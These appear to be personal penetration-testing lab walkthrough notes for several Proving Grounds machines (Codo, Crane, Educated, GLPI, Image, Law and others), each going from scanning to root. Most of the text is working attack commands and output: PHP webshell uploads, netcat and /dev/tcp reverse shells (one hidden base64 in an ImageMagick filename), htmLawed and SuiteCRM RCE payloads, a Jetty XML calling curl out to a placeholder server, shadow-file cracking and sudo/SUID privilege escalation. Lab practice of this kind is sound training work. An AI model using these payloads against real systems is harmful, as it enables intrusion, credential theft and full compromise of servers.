uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),1000(james)
cd /root
ls
flag2.txt
proof.txt
snap
cat proof.txt
5936ab49d8705757c2dd3eee1f88e75c
```



## Codo
1. Rustscan
```
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

2. Nmap 
```
nmap -p$(cat codo-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.185.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 00:38 EDT
Nmap scan report for 192.168.185.23
Host is up (0.31s latency).

Bug in http-generator: no string output.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: All topics | CODOLOGIC
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.12 seconds
```

3. Directory bruteforce
```
python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.185.23/    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/OSCP/pg/reports/http_192.168.185.23/__24-03-16_00-41-46.txt

Target: http://192.168.185.23/

[00:41:46] Starting: 
[00:41:53] 200 -  105B  - /.babelrc                                         
[00:42:01] 403 -  279B  - /.ht_wsr.txt                                      
[00:42:01] 403 -  279B  - /.htaccess.bak1                                   
[00:42:01] 403 -  279B  - /.htaccess.orig                                   
[00:42:01] 403 -  279B  - /.htaccess.sample
[00:42:01] 403 -  279B  - /.htaccess.save
[00:42:01] 403 -  279B  - /.htaccess_extra                                  
[00:42:01] 403 -  279B  - /.htaccess_orig
[00:42:01] 403 -  279B  - /.htaccess_sc
[00:42:01] 403 -  279B  - /.htaccessBAK
[00:42:02] 403 -  279B  - /.htaccessOLD
[00:42:02] 403 -  279B  - /.htaccessOLD2
[00:42:02] 403 -  279B  - /.htm                                             
[00:42:02] 403 -  279B  - /.html                                            
[00:42:02] 403 -  279B  - /.htpasswd_test                                   
[00:42:02] 403 -  279B  - /.htpasswds
[00:42:02] 403 -  279B  - /.httr-oauth
[00:42:06] 403 -  279B  - /.php                                             
[00:42:23] 301 -  316B  - /admin  ->  http://192.168.185.23/admin/          
[00:42:25] 200 -    2KB - /admin/                                           
[00:42:26] 200 -    2KB - /admin/index.php                                  
[00:42:26] 200 -    1KB - /admin/login.php                                  
[00:42:53] 301 -  316B  - /cache  ->  http://192.168.185.23/cache/          
[00:42:53] 200 -  489B  - /cache/                                           
[00:43:23] 200 -    8KB - /index.php                                        
[00:43:23] 200 -    4KB - /index.php/login/                                 
[00:43:59] 200 -   24KB - /README.md                                        
[00:44:04] 403 -  279B  - /server-status                                    
[00:44:04] 403 -  279B  - /server-status/                                   
[00:44:08] 301 -  316B  - /sites  ->  http://192.168.185.23/sites/          
                                                                             
Task Completed
```

4. Found default creds admin:admin and login in. 
```
http://192.168.185.23/admin/
```

5. Found exploit and use it. 
```
https://www.exploit-db.com/exploits/50978

 python3 50978.py -t http://192.168.185.23/ -u admin -p admin -i 192.168.45.174 -n 2323

CODOFORUM V5.1 ARBITRARY FILE UPLOAD TO RCE(Authenticated)

  ______     _______     ____   ___ ____  ____      _____ _  ___ ____  _  _
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ // |( _ ) ___|| || |
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \| |/ _ \___ \| || |_
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) | | (_) |__) |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/|_|\___/____/   |_|


Exploit found and written by: @vikaran101

[+] Login successful
[*] Checking webshell status and executing...
[-] Something went wrong, please try uploading the shell manually(admin panel > global settings > change forum logo > upload and access from http://192.168.185.23//sites/default/assets/img/attachments/[file.php])
```

6. Since, we can upload file now and know where the location of file so used monkey pentest reverse shell file to get foothold. 
```
Upload at - admin panel > global settings > change forum logo > upload

Access at - http://192.168.185.23//sites/default/assets/img/attachments/[file.php]

Obtained reverse shell 

nc -lvnp 2323
listening on [any] 2323 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.185.23] 34210
Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 04:52:04 up 48 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

7. Run linpeas and found root password. 
```
/var/www/html/sites/default/config.php:  'password' => 'FatPanda123',  

$ su root
Password: FatPanda123
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

8. Obtained root.txt
```
cat proof.txt
8a31f2b9723affd5425f0cb4d6bbcda6
```

## Crane
1. Rustscan
```
/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
3306/tcp  open  mysql   syn-ack
33060/tcp open  mysqlx  syn-ack
```

2. Nmap 
```
nmap -p$(cat crane-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.185.146
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 02:27 EDT
Nmap scan report for 192.168.185.146
Host is up (0.32s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry 
|_/
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=3/16%Time=65F53BE8%P=x86_64-pc-linux-gnu%
SF:r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTT
SF:POptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSV
SF:ersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTC
SF:P,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
SF:x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCoo
SF:kie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNe
SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStri
SF:ng,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x
SF:01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x2
SF:0message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Note
SF:sRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1
SF:a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,3
SF:2,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inva
SF:lid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.06 seconds
```

3. Login on port 80 with admin:admin credentials. Found suite crm version 7.12.3 in 'About'. 

4. Download the exploit from github for this version. 
```
https://github.com/manuelz120/CVE-2022-23940

pip3 install -r "requirements.txt"
```

5. Run exploit and then obtained foothold. 
```
python3 exploit.py -u admin -p admin --host http://192.168.185.146/ --payload "php -r '\$sock=fsockopen(\"192.168.45.174\", 4545); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report

nc -nvlp 4545                             
listening on [any] 4545 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.185.146] 58936
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

6. Check sudo permission, perform privilege escalation. Obtained proof.txt and local.txt
```
sudo /usr/sbin/service ../../bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

cat proof.txt
1fdb7ee6e4c0336b25aceac082bba89d

root@crane:/var/www# cat local.txt
cat local.txt
ac5b54bec1545f1243c462061f35c236
```



## Educated
1. Rustscan and nmap
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

2. Sub-directory bruteforce
```
python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.223.13/

http://192.168.223.13/management/
```

3. Use burpsuite for uploading cmd file.  https://www.exploit-db.com/exploits/50587
```
POST /management/admin/examQuestion/create HTTP/1.1

Host: 192.168.223.13

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544

Content-Length: 1331

Connection: close

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1



-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="name"



test4

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="class_id"



2

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="subject_id"



5

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="timestamp"



2021-12-08

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="teacher_id"



1

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="file_type"



txt

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="status"



1

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="description"



123123

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="_wysihtml5_mode"



1

-----------------------------183813756938980137172117669544

Content-Disposition: form-data; name="file_name"; filename="cmd.php"

Content-Type: application/octet-stream



<?php system($_GET["cmd"]); ?>

-----------------------------183813756938980137172117669544--
```

4. Obtained reverse shell. 
```
http://192.168.223.13/management/uploads/exam_question/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.45.153%204445%20%3E%2Ftmp%2Ff

nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.223.13] 46218
bash: cannot set terminal process group (1057): Inappropriate ioctl for device
bash: no job control in this shell
www-data@school:/var/www/html/management/uploads/exam_question$
```

5. Found mysql creds and from there found another creds. 
```
www-data@school:/var/www/html/management/application/config$ cat database.php

'username' => 'school',
'password' => '@jCma4s8ZM<?kA',

www-data@school:/var/www/html/management/application/config$ mysql -u school -p
<l/management/application/config$ mysql -u school -p         
Enter password: @jCma4s8ZM<?kA
use school_mgment;
select * from teacher;
use teacher;

msander:3db12170ff3e811db10a76eadd9e9986e3c1a5b7
```

6. Ssh login and transfer grade-app.apk to local host. 
```
ssh msander@192.168.223.13

msander@school:/home/emiller/development$ scp grade-app.apk kali@192.168.45.153:/home/kali/OSCP/pg/

```

7. Open it using jadx and find anther creds. 
```
jadx-gui grade-app.apk 

 `emiller:EzPwz2022_dev1$$23!!`
```

8. Rooted and root.txt
```
emiller@school:~/development$ sudo bash
root@school:/home/emiller/development#
```

## Extplorer
1. Rustscan
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

2. Bruteforce sub-directory
```
python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.245.13/

[23:57:32] 200 -    2KB - /filemanager/   
```

3. Login with admin:admin credentials at filemanager. Successful. 

4. Upload reverse shell, monkey pentest, in /wp-inclues/assets/

5. Obtained reverse shell. 
```
nc -nvlp 4449      
listening on [any] 4449 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.245.16] 52108
Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 04:01:41 up 12 min,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

6. Found user dora shadow file at /filemanager/config/.htusers.php. Crack it. 
```
john --wordlist=/usr/share/wordlists/rockyou.txt dora.txt 

doraemon         (?)  
```

7. Login as dora, found disk partition. Use it for privilege escalation. Obtained local.txt. 
https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------
```
id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)

debugfs /dev/mapper/ubuntu--vg-ubuntu--lv

debugfs:  cd /root
```

8. Get root shadow and crack it. 
```
cat /etc/shadow

john --wordlist=/usr/share/wordlists/rockyou.txt root.txt

explorer         (?)  
```

9. Login as root and obtained root.txt
```
cat proof.txt
f518e2b6102c751dea4208ac8171a224
```



## GLPI
1. Rustscan and nmap 
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

nmap -A -T4 -p80,22 192.168.223.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 20:23 EDT
Nmap scan report for 192.168.223.242
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Authentication - GLPI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds
```

2. Capture traffic with burpsuite and get reverse shell by making changes (only port 80 works for reverse shell)
```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1

sid=nnq477d8gl6r20k6tlo28gvjc0&text=call_user_func&hhook=array_map&hexec=passthru&spec[0]=&spec[1]=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+192.168.45.153+80+>/tmp/fcd 

sudo nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.223.242] 55970
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

3. Mysql running for find password for user or add new password. 
```
www-data@glpi:/var/www/glpi/config$ cat config_db.php
cat config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = 'glpi_db_password';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}

www-data@glpi:/var/www/glpi/config$ mysql -u glpi -p
mysql -u glpi -p
Enter password: glpi_db_password

show databases;
use glpi;
show tables;
select * from glpi_users;
select name, password from glpi_users where name = 'betty';
update glpi_users SET password = '$2y$10$Kq6wuIrbcED3xBHQSTp2W.845KRt5vDRrcka9cDufnDF1EKpsQ/PO' where name = 'betty';
(password = bebek)
```

4. Logged in GLPI portal and get betty ssh password
```
Hello Betty,

i changed your password to : SnowboardSkateboardRoller234

Please change it again as soon as you can.

regards.

Lucas
```

5. ssh login and find out 8080 internal port listener. Port forward and figure out jetty server running
```
   LISTEN 0      50            0.0.0.0:8080         0.0.0.0:*  
   
ssh -L 1234:localhost:8080 betty@192.168.223.242

http://127.0.0.1:1234/
icon Powered by Eclipse Jetty:// Server
```

6. Privilege escalation using jetty server. https://github.com/Mike-n1/tips/blob/main/JettyShell.xml?source=post_page-----555ce2d9234e--------------------------------
```
betty@glpi:/tmp$ chmod 777 root.sh
betty@glpi:/tmp$ bash -p

betty@glpi:/opt/jetty/jetty-base/webapps$ cat rooted.xml 
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/bin/sh</Item>
                    <Item>-c</Item>
                    <Item>curl -F "r=`id`" http://yourServer:1337/</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>

betty@glpi:/opt/jetty/jetty-base/webapps$ bash -p
bash-5.0# id
uid=1000(betty) gid=1000(betty) euid=0(root) egid=0(root) groups=0(root),1000(betty)
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
proof.txt  snap
bash-5.0# cat proof.txt
88bc3fc1b60c15ea81b38423542ba404
```


## Hub
1. Rustscan
```
PORT     STATE SERVICE         REASON                                        
22/tcp   open  ssh             syn-ack                                       
80/tcp   open  http            syn-ack                                       
8082/tcp open  blackice-alerts syn-ack                                       
9999/tcp open  abyss           syn-ack  
```

2. Nmap 
```
 nmap -p$(cat hub-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.223.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 05:06 EDT
Nmap scan report for 192.168.223.25
Host is up (0.31s latency).

PORT     STATE  SERVICE     VERSION
2/tcp    closed compressnet
80/tcp   open   http        nginx 1.18.0
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0
8082/tcp open   http        Barracuda Embedded Web Server
| http-webdav-scan: 
|   Server Date: Sat, 16 Mar 2024 09:07:16 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Posix)
|_  WebDAV type: Unknown
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
9999/tcp open   ssl/http    Barracuda Embedded Web Server
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
|_http-title: Home
| http-webdav-scan: 
|   Server Date: Sat, 16 Mar 2024 09:07:18 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Posix)
|_  WebDAV type: Unknown
|_http-server-header: BarracudaServer.com (Posix)
```

3. Found version of fuguhub
```
http://192.168.223.25:8082/rtl/about.lsp
```

4. Found the exploit. 
```
https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-**27697**
```

5. Run the exploit and obtained reverse shell. 
```
python3 exploit.py -r 192.168.223.25 -rp 8082 -l 192.168.45.174 -p 800

nc -nvlp 800
listening on [any] 800 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.223.25] 51392
id
uid=0(root) gid=0(root) groups=0(root)
```

6. Obtained root.txt
```
cat ../../../root/proof.txt
12b2f03cc2c3f5b157326ea12eb9da38
```


## Image
1. Rustscan 
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

2. Nmap 
```
 nmap -A -T4 -p22,80 192.168.223.178                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 08:00 EDT
Nmap scan report for 192.168.223.178
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: ImageMagick Identifier
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.85 seconds
```

3. Found jpeg and png file upload at port 80. Create jpeg file by adding **FF D8 FF E0** header using hexeditor. 

4. Create payload as per ImageMagick version 6.9.6-4 exploit. 
```
https://github.com/ImageMagick/ImageMagick/issues/6339

┌──(kali㉿kali)-[~/OSCP/pg]
└─$ cp shell1.jpeg '|shell1”`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTc0LzQ0NDkgMD4mMQ== | base64 -d | bash`”.jpeg'
```

5. Upload it and obtained reverse shell. 
![[Pasted image 20240316205939.png]]
```
nc -lvnp 4449
listening on [any] 4449 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.223.178] 36226
bash: cannot set terminal process group (1156): Inappropriate ioctl for device
bash: no job control in this shell
www-data@image:/var/www/html$
```

6. Privilege using strace SUID. 
```
www-data@image:/$ /usr/bin/strace -o /dev/null /bin/sh -p
/usr/bin/strace -o /dev/null /bin/sh -p
whoami
root
```

7. Found local.txt and root.txt
```
cat proof.txt
dd0a4bf7021c6d44dea97450a8d81929

cat local.txt
9dc64eb2b6098c23db9bf047cc41868d
```



## Law

Exploit = https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/?source=post_page-----bc9d7f7b2941--------------------------------


1. Rustscan and Nmap 
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: htmLawed (1.2.5) test
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at map.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds
```

2. Run exploit 
a. Checking out
```
curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://192.168.223.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

```

b. Obtained reverse shell and local.txt
```
 curl -s -d 'sid=foo&hhook=exec&text=nc 192.168.45.153 4449 -e /bin/sh' -b 'sid=foo' http://192.168.220.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'

sudo nc -lvnp 4449
listening on [any] 4449 ...
